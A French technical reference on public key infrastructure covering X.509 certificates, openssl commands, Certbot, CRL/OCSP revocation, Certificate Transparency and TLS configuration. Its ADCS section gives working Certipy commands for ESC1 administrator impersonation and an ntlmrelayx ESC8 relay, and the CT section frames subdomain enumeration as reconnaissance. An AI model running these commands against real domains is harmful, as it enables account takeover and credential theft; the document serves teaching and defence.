---
title: PKI en profondeur
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [pki, certificats, tls, x509, ca, crl, ocsp, sécurité]
date: 2026-03-22
---

# PKI en profondeur

La PKI (Public Key Infrastructure) est le système qui permet d'établir la confiance dans les clés publiques à travers des certificats numériques signés par des autorités.

## Concepts fondamentaux

### Certificat X.509

Un certificat X.509 est un document numérique signé qui lie une clé publique à une identité.

```
Structure d'un certificat X.509 v3 :

┌─────────────────────────────────────────────┐
│ Version (v3)                                 │
│ Numéro de série (unique chez l'émetteur)     │
│ Algorithme de signature (SHA256withRSA...)   │
│ Émetteur (Issuer) : CN=Let's Encrypt...      │
│ Validité :                                   │
│   NotBefore : 2026-01-01                     │
│   NotAfter  : 2026-04-01                     │
│ Sujet (Subject) : CN=www.example.com         │
│ Clé publique (RSA/ECDSA + valeur)            │
│ Extensions :                                 │
│   Subject Alternative Names (SAN)           │
│   Key Usage                                  │
│   Extended Key Usage                         │
│   Basic Constraints (CA: true/false)         │
│   CRL Distribution Points                    │
│   Authority Information Access (OCSP URL)   │
│   Subject Key Identifier                     │
│   Authority Key Identifier                   │
├─────────────────────────────────────────────┤
│ Signature de l'émetteur (sur tout ce qui    │
│ précède)                                     │
└─────────────────────────────────────────────┘
```

### Hiérarchie de confiance

```
Root CA (auto-signé)
  ↓ signe
Intermediate CA (CA intermédiaire)
  ↓ signe
End-entity certificate (certificat feuille — serveur, client, code signing)

Avantages de la chaîne :
- La Root CA peut rester hors ligne (air-gapped) pour la sécuriser
- En cas de compromission d'une Intermediate CA → seule elle est révoquée
- Flexibilité : plusieurs Intermediate CA pour des usages différents
```

## Inspection de certificats

```bash
# Afficher un certificat
openssl x509 -in cert.pem -text -noout

# Informations clés
openssl x509 -in cert.pem -noout -subject -issuer -dates -serial

# Empreinte (fingerprint)
openssl x509 -in cert.pem -noout -fingerprint -sha256

# Récupérer le certificat d'un serveur
openssl s_client -connect example.com:443 -servername example.com </dev/null |
    openssl x509 -text -noout

# Vérifier la chaîne de confiance
openssl verify -CAfile ca-bundle.pem cert.pem

# Vérifier les SAN (Subject Alternative Names)
openssl x509 -in cert.pem -noout -ext subjectAltName
```

## Génération de certificats

### Clés et CSR

```bash
# Générer une clé privée RSA
openssl genrsa -out private.key 2048
openssl genrsa -out private.key 4096  # Plus sécurisé

# Clé ECDSA (plus efficace)
openssl ecparam -name prime256v1 -genkey -noout -out private.key
openssl ecparam -name secp384r1 -genkey -noout -out private.key

# Afficher la clé publique correspondante
openssl rsa -in private.key -pubout

# Créer une CSR (Certificate Signing Request)
openssl req -new -key private.key -out request.csr \
    -subj "/C=FR/ST=Paris/L=Paris/O=MyOrg/CN=www.example.com"

# CSR avec SAN (Subject Alternative Names)
openssl req -new -key private.key -out request.csr -config san.conf
```

```ini
# san.conf — configuration avec SAN
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
CN = www.example.com
O = MyOrg
C = FR

[v3_req]
subjectAltName = @alt_names

[alt_names]
DNS.1 = www.example.com
DNS.2 = example.com
DNS.3 = api.example.com
IP.1 = 93.184.216.34
```

### Signer un certificat (CA locale)

```bash
# Créer une CA auto-signée
openssl req -new -x509 -days 3650 -key ca.key -out ca.crt \
    -subj "/C=FR/O=MyCA/CN=My Root CA"

# Signer une CSR avec la CA
openssl x509 -req -days 365 -in request.csr -CA ca.crt -CAkey ca.key \
    -CAcreateserial -out signed.crt -extensions v3_req -extfile san.conf

# Vérifier la signature
openssl verify -CAfile ca.crt signed.crt
```

### Let's Encrypt (Certbot)

```bash
# Obtenir un certificat Let's Encrypt (avec validation HTTP)
certbot --nginx -d example.com -d www.example.com
certbot --apache -d example.com
certbot certonly --standalone -d example.com  # Sans serveur web

# Renouvellement automatique
certbot renew --dry-run  # Test
# Cron : 0 12 * * * certbot renew --quiet

# Wildcard (validation DNS)
certbot certonly --dns-cloudflare -d "*.example.com" -d example.com \
    --dns-cloudflare-credentials ~/.secrets/cloudflare.ini
```

## Révocation de certificats

### CRL (Certificate Revocation List)

```bash
# Vérifier si un certificat est dans une CRL
# 1. Récupérer l'URL de la CRL depuis le certificat
openssl x509 -in cert.pem -noout -text | grep "CRL Distribution Points" -A3

# 2. Télécharger la CRL
curl -o crl.der http://crl.example.com/ca.crl
openssl crl -inform DER -in crl.der -text -noout

# 3. Vérifier
openssl verify -CAfile ca.crt -crl_check -CRLfile crl.pem cert.pem
```

### OCSP (Online Certificate Status Protocol)

OCSP permet de vérifier la révocation en temps réel (plus efficace que les CRL).

```bash
# Vérifier le statut OCSP d'un certificat
# 1. Récupérer l'URL OCSP
openssl x509 -in cert.pem -noout -ocsp_uri

# 2. Vérifier
openssl ocsp -issuer issuer.crt -cert cert.pem \
    -url http://ocsp.example.com -resp_text

# OCSP Stapling (serveur inclut la réponse OCSP dans le handshake TLS)
# Nginx
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /path/to/chain.pem;
```

## Certificate Transparency (CT)

Registres publics et auditables de tous les certificats émis.

```bash
# Rechercher des certificats pour un domaine
curl "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value' | sort -u

# Sous-domaines découverts via CT Logs
# Utile pour la reconnaissance (voir tous les sous-domaines d'une organisation)
curl "https://crt.sh/?q=example.com&output=json" |
    jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

## Active Directory Certificate Services (ADCS)

ADCS est l'implémentation Microsoft de PKI, souvent vulnérable dans les environnements Windows.

### Vulnérabilités (ESC1-ESC8)

```powershell
# Énumération des templates de certificats (Certipy)
certipy find -u alice@domaine.local -p password -dc-ip 192.168.1.10

# ESC1 — Template permettant de spécifier un SAN arbitraire
# (n'importe qui peut demander un certificat pour Administrator)
certipy req -u alice@domaine.local -p password \
    -ca domaine-CA \
    -template VulnerableTemplate \
    -upn administrator@domaine.local  # SAN arbitraire → impersonation

# Authentifier avec le certificat obtenu (PKINIT)
certipy auth -pfx administrator.pfx -domain domaine.local
# → Obtient le hash NTLM de l'Administrator

# ESC8 — NTLM relay vers l'enrollment web ADCS
# Relay vers http://CA-SERVER/certsrv/certfnsh.asp
ntlmrelayx -t http://CA-SERVER/certsrv/certfnsh.asp -smb2support --adcs
```

## TLS — configuration sécurisée

```nginx
# Nginx — configuration TLS moderne (Mozilla Intermediate)
ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
ssl_trusted_certificate /etc/letsencrypt/live/example.com/chain.pem;

ssl_protocols TLSv1.2 TLSv1.3;
ssl_prefer_server_ciphers off;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;

# HSTS
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;

# OCSP Stapling
ssl_stapling on;
ssl_stapling_verify on;
```

```bash
# Tester la configuration TLS
sslyze --regular example.com
testssl.sh example.com
nmap --script ssl-enum-ciphers -p 443 example.com

# Problèmes courants
# TLS 1.0/1.1 activé       → Désactiver (vulnérable à BEAST, POODLE)
# RC4                        → Désactiver
# Certificat expiré/auto-signé
# SAN manquant               → Chrome exige SAN depuis 2017
# HSTS absent                → Vulnérable aux downgrade attacks
```

## Certificate Pinning

Technique qui compare le certificat reçu à une valeur attendue codée en dur, indépendamment de la CA.

```python
# Python — pinning via SPKI hash (Subject Public Key Info)
import ssl, hashlib, base64, socket

EXPECTED_SPKI_HASH = "sha256//abc123..."  # Hash de la clé publique attendue

context = ssl.create_default_context()
conn = context.wrap_socket(socket.socket(), server_hostname="api.example.com")
conn.connect(("api.example.com", 443))

cert_der = conn.getpeercert(binary_form=True)
# Extraire et hasher le SPKI pour comparer
# (utiliser la bibliothèque cryptography pour l'extraction précise du SPKI)
```
